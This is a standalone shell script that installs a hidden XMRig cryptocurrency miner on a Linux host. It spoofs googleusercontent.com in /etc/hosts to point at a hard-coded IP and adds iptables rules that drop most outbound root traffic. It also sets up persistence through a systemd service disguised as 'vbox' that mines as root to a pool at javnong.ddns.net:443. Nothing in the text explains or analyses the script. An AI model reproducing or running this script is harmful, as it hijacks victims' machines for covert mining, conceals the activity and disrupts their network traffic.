sudo echo "vm.nr_hugepages = 1168" >> /etc/sysctl.conf &&
chmod +x xml.tar.gz
tar xvf xmk.tar.gz
cd miner
sudo mv miner xml
cd xml && chmod +x xmrigDaemon
sudo -- sh -c "echo '104.131.103.118  googleusercontent.com' >> /etc/hosts" 
sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
sudo iptables -I OUTPUT 3 -p tcp -d googleusercontent.com  -j ACCEPT
sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
bash -c 'cat <<EOT >>/lib/systemd/system/vbox.service 
[Unit]
Description=vbox
After=network.target
[Service]
ExecStart= /usr/local/src/miner/xmrigDaemon --donate-level 1 --donate-over-proxy 1 -o javnong.ddns.net:443 -k --tls
WatchdogSec=300
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable vbox.service &&
service vbox start

